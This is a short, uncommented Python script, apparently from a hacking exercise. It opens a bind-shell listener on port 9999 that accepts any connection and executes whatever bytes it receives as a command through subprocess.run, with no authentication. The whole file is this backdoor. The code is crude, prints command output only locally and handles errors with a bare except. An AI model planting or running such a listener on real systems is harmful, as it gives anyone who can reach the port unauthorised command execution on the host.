import socket
import subprocess
from subprocess import PIPE


bind_ip = "192.168.206.133"
bind_port = 9999

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((bind_ip,bind_port))

server.listen(5)

print("[*] Listening on " , bind_ip, bind_port)

while True:
    client,addr = server.accept()
    print('Connected by ', addr)

    while True:
        data = client.recv(1024)
        print("Client recv data :", data)
        try:
            process = subprocess.run(data, stdout=PIPE, stderr=PIPE)
            print(process.stdout)
        except:
            print('error')